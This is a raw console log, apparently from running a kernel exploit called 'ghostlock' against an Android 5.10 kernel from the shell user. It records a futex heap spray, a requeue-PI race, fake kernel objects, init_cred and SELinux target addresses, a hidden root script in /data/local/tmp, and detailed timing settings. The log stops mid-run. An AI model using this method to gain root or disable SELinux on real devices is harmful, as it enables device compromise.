[33m[*] [0mkernel: 5.10.237-android12-9-31999025-abA536EXXSMGZE2
[32m[+] [0mresolved profile loaded: 5.10.237-android12-9-31999025-abA536EXXSMGZE2
[33m[*] [0mcpu pair: main=0 consumer=1
[33m[*] [0mruntime home=/data/local/tmp script=/data/local/tmp/.ghostlock_root.sh
[33m[*] [0mdebug.execution.begin release=5.10.237-android12-9-31999025-abA536EXXSMGZE2
[33m[*] [0mdebug.execution.recommended_cpus.main=0
[33m[*] [0mdebug.execution.recommended_cpus.consumer=1
[33m[*] [0mdebug.execution.selected_cpus.main=0
[33m[*] [0mdebug.execution.selected_cpus.consumer=1
[33m[*] [0mdebug.execution.heap.prepare_max_attempts=4
[33m[*] [0mdebug.execution.heap.prepare_timeout_ms=240000
[33m[*] [0mdebug.execution.heap.kernelsnitch_timeout_ms=60000
[33m[*] [0mdebug.execution.race.route_wait_ms=1000
[33m[*] [0mdebug.execution.race.setup_settle_us=50000
[33m[*] [0mdebug.execution.race.state_poll_interval_us=1000
[33m[*] [0mdebug.execution.stages.w1_attempts=15
[33m[*] [0mdebug.execution.stages.w1_settle_us=100000
[33m[*] [0mdebug.execution.stages.w1_scratch_repair_attempts=3
[33m[*] [0mdebug.execution.stages.w2_attempts=15
[33m[*] [0mdebug.execution.stages.w2_settle_us=100000
[33m[*] [0mdebug.execution.stages.w3_chain_rounds=3
[33m[*] [0mdebug.execution.stages.w3_attempts=6
[33m[*] [0mdebug.execution.stages.w3_settle_us=50000
[33m[*] [0mdebug.execution.routes.tcp_zerocopy.attempts=0
[33m[*] [0mdebug.execution.routes.tcp_zerocopy.arm_sequence=0
[33m[*] [0mdebug.execution.routes.tcp_zerocopy.post_receive_hold_iterations=0
[33m[*] [0mdebug.execution.routes.select_stack.enter_delay_us=50000
[33m[*] [0mdebug.execution.routes.select_stack.timeout_us=200000
[33m[*] [0mdebug.execution.routes.select_stack.consumer_max_calls=1
[33m[*] [0mdebug.execution.routes.select_stack.consumer_burst_calls=1
[33m[*] [0mdebug.execution.handoff.pre_dispatch_settle_ms=2000
[33m[*] [0mdebug.execution.handoff.module_poll_attempts=30
[33m[*] [0mdebug.execution.handoff.module_poll_interval_ms=100
[33m[*] [0mdebug.execution.handoff.enforce_poll_attempts=200
[33m[*] [0mdebug.execution.handoff.enforce_poll_interval_ms=100
[33m[*] [0mdebug.execution.end
[33m[*] [0msoc: qcom/other; kernel_phys_load=0x80000000
[33m[*] [0minit_cred image=ffffffc009c12020 alias=ffffff8001c12020
[33m[*] [0mroot script written path=/data/local/tmp/.ghostlock_root.sh bytes=6081
[33m[*] [0miomem cache: no usable dump, keeping the built-in geometry
[32m[+] [0mstartup context pid=16211 uid=2000 euid=2000 gid=2000 egid=2000 boot_ms=236534 attr=u:r:shell:s0 enforce=1
[32m[+] [0mstartup limits pid=16211 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
[32m[+] [0mbuild config pid=16211 label=ghostlock_oplus slide=pselect main=pselect
[32m[+] [0mp0 profile pid=16211 phys_offset=0000000080000000 kernel_phys_load=0000000080000000 delta=0000000000000000 slide_logger=ffffff8001e01370 bootid_data=ffffff8002282109 init_task=ffffff8001e0dd00 root_tg=ffffff8002082080 sysctl_bootid=ffffff8002282109
[33m[*] [0mp0 kernel_phys_load=0000000080000000 delta=0000000000000000
[33m[*] [0mmain thread running on cpu=0
[33m[*] [0m[T+0ms] exploit start
[33m[*] [0m[T+1ms] pre-W1 drain
[33m[*] [0mW1: SELinux attempt 1/15
[33m[*] [0m=== W1: SELinux === target=0xffffff80021ddb68 mode=1 leaf=0
[33m[*] [0m[T+660ms]   heap spray start
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +1484ms
[33m[*] [0m[spray] finding futex collisions... +2926ms
[33m[*] [0m[spray] early collision screen 5/3 at 37%
[33m[*] [0m[spray] futex collisions found +4806ms
[33m[*] [0m[spray] early collision screen 7/3 at 37%
[33m[*] [0mA53_DMA32_SKIP attempt=1 base=0xffffff801e428000 refs=272 total=271
[33m[*] [0m[spray] early collision screen 7/3 at 37%
[33m[*] [0mA53_DMA32_SKIP attempt=2 base=0xffffff801e428000 refs=272 total=542
[33m[*] [0m[spray] early collision screen 6/3 at 37%
[33m[*] [0mA53_DMA32_SKIP attempt=3 base=0xffffff801e428000 refs=272 total=813
[33m[*] [0m[spray] early collision screen 6/3 at 37%
[33m[*] [0mA53_DMA32_SKIP attempt=4 base=0xffffff801e428000 refs=272 total=1084
[33m[*] [0m[spray] early collision screen 6/3 at 37%
[33m[*] [0mA53_DMA32_SKIP attempt=5 base=0xffffff801e428000 refs=272 total=1355
[33m[*] [0m[spray] early collision screen 6/3 at 37%
[33m[*] [0mA53_DMA32_SKIP attempt=6 base=0xffffff801e428000 refs=272 total=1626
[33m[*] [0m[spray] early collision screen 6/3 at 37%
[33m[*] [0mA53_DMA32_SKIP attempt=7 base=0xffffff801e428000 refs=272 total=1897
[33m[*] [0m[spray] early collision screen 6/3 at 37%
[33m[*] [0mA53_DMA32_SKIP attempt=8 base=0xffffff801e428000 refs=272 total=2168
[33m[*] [0m[spray] early collision screen 6/3 at 37%
[33m[*] [0mA53_DMA32_SKIP attempt=9 base=0xffffff801e428000 refs=272 total=2439
[33m[*] [0m[spray] early collision screen 6/3 at 37%
[33m[*] [0mA53_DMA32_SKIP attempt=10 base=0xffffff801e428000 refs=272 total=2710
[33m[*] [0m[spray] early collision screen 6/3 at 37%
[33m[*] [0mA53_DMA32_SKIP attempt=11 base=0xffffff801e428000 refs=272 total=2981
[33m[*] [0m[spray] early collision screen 6/3 at 37%
[33m[*] [0mA53_DMA32_SKIP attempt=12 base=0xffffff801e428000 refs=272 total=3252
[33m[*] [0m[spray] early collision screen 6/3 at 37%
[33m[*] [0mA53_DMA32_SKIP attempt=13 base=0xffffff801e428000 refs=272 total=3523
[33m[*] [0m[spray] early collision screen 6/3 at 37%
[33m[*] [0mA53_DMA32_SKIP attempt=14 base=0xffffff801e428000 refs=272 total=3794
[33m[*] [0m[spray] early collision screen 6/3 at 37%
[33m[*] [0mA53_DMA32_SKIP attempt=15 base=0xffffff801e428000 refs=272 total=4065
[33m[*] [0m[spray] early collision screen 6/3 at 37%
[33m[*] [0mA53_DMA32_SKIP attempt=16 base=0xffffff801e428000 refs=272 total=4336
[33m[*] [0m[spray] early collision screen 6/3 at 37%
[33m[*] [0mA53_DMA32_SKIP attempt=17 base=0xffffff801e428000 refs=272 total=4607
[33m[*] [0m[spray] early collision screen 6/3 at 37%
[33m[*] [0mA53_DMA32_SKIP attempt=18 base=0xffffff801e428000 refs=272 total=4878
[33m[*] [0m[spray] early collision screen 6/3 at 37%
[33m[*] [0mA53_DMA32_SKIP attempt=19 base=0xffffff801e428000 refs=272 total=5149
[33m[*] [0m[spray] early collision screen 3/3 at 42%
[33m[*] [0mA53_DMA32_SKIP attempt=20 base=0xffffff801e428000 refs=272 total=5420
[33m[*] [0m[spray] early collision screen 3/3 at 37%
[33m[*] [0m[spray] early collision screen 3/1 at 50%
[33m[*] [0m[spray] early collision screen 7/3 at 37%
[33m[*] [0m[spray] early collision screen 4/1 at 50%
[33m[*] [0m[spray] early collision screen 9/3 at 37%
[33m[*] [0m[spray] early collision screen 7/1 at 50%
[33m[*] [0m[spray] early collision screen 8/3 at 37%
[33m[*] [0m[spray] early collision screen 5/1 at 50%
[33m[*] [0m[spray] early collision screen 6/3 at 37%
[33m[*] [0m[spray] early collision screen 4/1 at 50%
[33m[*] [0m[spray] early collision screen 4/3 at 37%
[33m[*] [0m[spray] early collision screen 2/1 at 50%
[33m[*] [0m[spray] early collision screen 7/3 at 37%
[33m[*] [0m[spray] early collision screen 6/1 at 50%
[33m[*] [0m[spray] early collision screen 6/3 at 37%
[33m[*] [0m[spray] early collision screen 4/1 at 50%
[33m[*] [0m[spray] early collision screen 5/3 at 37%
[33m[*] [0m[spray] early collision screen 4/1 at 50%
[33m[*] [0m[spray] early collision screen 4/3 at 37%
[33m[*] [0m[spray] early collision screen 4/1 at 50%
[33m[*] [0m[spray] early collision screen 4/3 at 37%
[33m[*] [0m[spray] early collision screen 4/3 at 37%
[33m[*] [0m[spray] early collision screen 4/3 at 37%
[33m[*] [0m[spray] early collision screen 4/3 at 37%
[33m[*] [0m[spray] early collision screen 4/3 at 37%
[33m[*] [0m[spray] early collision screen 4/3 at 37%
[33m[*] [0m[spray] early collision screen 9/3 at 37%
[33m[*] [0m[spray] early collision screen 6/1 at 50%
[33m[*] [0m[spray] early collision screen 5/3 at 37%
[33m[*] [0m[spray] early collision screen 4/1 at 50%
[33m[*] [0m[spray] early collision screen 4/3 at 37%
[33m[*] [0m[spray] early collision screen 2/1 at 50%
[33m[*] [0m[spray] early collision screen 12/3 at 37%
[33m[*] [0m[spray] early collision screen 8/1 at 50%
[33m[*] [0m[spray] early collision screen 3/3 at 46%
[33m[*] [0m[spray] early collision screen 1/1 at 50%
[33m[*] [0m[spray] early collision screen 3/3 at 37%
[33m[*] [0m[spray] early collision screen 4/1 at 50%
[33m[*] [0m[spray] early collision screen 3/1 at 50%
[33m[*] [0m[spray] early collision screen 5/1 at 50%
[33m[*] [0m[spray] early collision screen 3/1 at 50%
[33m[*] [0m[spray] early collision screen 5/1 at 50%
[33m[*] [0m[spray] early collision screen 2/1 at 50%
[33m[*] [0m[spray] early collision screen 1/1 at 50%
[33m[*] [0m[spray] early collision screen 6/1 at 50%
[33m[*] [0m[spray] early collision screen 2/1 at 50%
[33m[*] [0m[spray] early collision screen 2/1 at 50%
[33m[*] [0m[spray] early collision screen 5/1 at 50%
[33m[*] [0m[spray] early collision screen 4/1 at 50%
[33m[*] [0m[spray] early collision screen 2/1 at 50%
[33m[*] [0m[spray] early collision screen 5/1 at 50%
[33m[*] [0m[spray] early collision screen 7/3 at 37%
[33m[*] [0m[spray] early collision screen 5/1 at 50%
[33m[*] [0m[spray] early collision screen 5/3 at 37%
[33m[*] [0m[spray] early collision screen 1/1 at 50%
[33m[*] [0m[spray] early collision screen 8/3 at 37%
[33m[*] [0m[spray] early collision screen 5/1 at 50%
[33m[*] [0m[spray] early collision screen 5/3 at 37%
[33m[*] [0m[spray] early collision screen 4/1 at 50%
[33m[*] [0m[spray] early collision screen 10/3 at 37%
[33m[*] [0m[spray] early collision screen 7/1 at 50%
[33m[*] [0m[spray] early collision screen 4/3 at 37%
[33m[*] [0m[spray] early collision screen 2/1 at 50%
[33m[*] [0m[spray] early collision screen 4/3 at 37%
[33m[*] [0m[spray] early collision screen 2/1 at 50%
[33m[*] [0m[spray] early collision screen 6/3 at 37%
[33m[*] [0m[spray] early collision screen 4/1 at 50%
[33m[*] [0m[spray] early collision screen 4/3 at 37%
[33m[*] [0m[spray] early collision screen 2/1 at 50%
[33m[*] [0m[spray] early collision screen 6/3 at 37%
[33m[*] [0m[spray] early collision screen 3/1 at 50%
[33m[*] [0m[spray] early collision screen 6/1 at 50%
[33m[*] [0m[spray] early collision screen 4/1 at 50%
[33m[*] [0m[spray] early collision screen 5/1 at 50%
[33m[*] [0m[spray] early collision screen 5/1 at 50%
[33m[*] [0m[spray] early collision screen 4/1 at 50%
[33m[*] [0m[spray] early collision screen 6/1 at 50%
[33m[*] [0m[spray] early collision screen 3/1 at 50%
[33m[*] [0m[spray] early collision screen 3/1 at 50%
[33m[*] [0m[spray] early collision screen 2/1 at 50%
[33m[*] [0m[spray] early collision screen 1/1 at 50%
[33m[*] [0m[spray] early collision screen 4/1 at 50%
[33m[*] [0m[spray] early collision screen 3/1 at 50%
[33m[*] [0m[spray] early collision screen 5/1 at 50%
[33m[*] [0m[spray] early collision screen 3/1 at 50%
[33m[*] [0m[spray] early collision screen 4/1 at 50%
[33m[*] [0m[spray] early collision screen 2/1 at 50%
[33m[*] [0m[spray] early collision screen 2/1 at 50%
[33m[*] [0m[spray] early collision screen 2/1 at 50%
[33m[*] [0m[spray] early collision screen 4/1 at 50%
[33m[*] [0m[spray] early collision screen 3/1 at 50%
[33m[*] [0m[spray] early collision screen 3/1 at 50%
[33m[*] [0m[spray] early collision screen 4/3 at 37%
[33m[*] [0m[spray] early collision screen 3/1 at 50%
[33m[*] [0m[spray] early collision screen 3/3 at 48%
[33m[*] [0m[spray] early collision screen 2/1 at 50%
[33m[*] [0m[spray] early collision screen 5/3 at 37%
[33m[*] [0m[spray] early collision screen 4/1 at 50%
[33m[*] [0m[spray] early collision screen 9/3 at 37%
[33m[*] [0mA53_GROUP_SELECTED base=0xffffff892edf0000 zone=normal objects=34 attempts=256
[33m[*] [0mA53_TRIGGER_READY slabs=24 refs=816
[33m[*] [0mA53_TARGET_TAIL_FREE batch=34
[33m[*] [0m[spray] a53 group freed base=0xffffff892edf0000 objects=34 +357218ms
[33m[*] [0m[spray] payload ready +357225ms
[33m[*] [0mprepare_kernel_page ok attempt=1 +357464ms
[33m[*] [0m[T+358132ms]   heap spray done
[33m[*] [0m[route] creating waiter/owner/consumer
[33m[*] [0mconsumer thread running on cpu=1
[33m[*] [0m[route] waiter parked; owner started
[33m[*] [0m[route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[33m[*] [0mpselect route setup shift=0 page=ffffff892edf0000 fake_lock=ffffff892edf0000 fake_w0=ffffff892edf0300 fake_task=ffffff892edf0400 in0=0000000000000000 in3=0000000000000000 out0=0000000000000001 ex0=0000000000000001 ex1=0000000000000000 ex2=ffffff892edf0400 ex3=ffffff892edf0000
[33m[*] [0mpselect pre-select attempt=1/1 compact=0 +0ms
[33m[*] [0mpselect post-select attempt=1/1 compact=0 +202ms ret=5
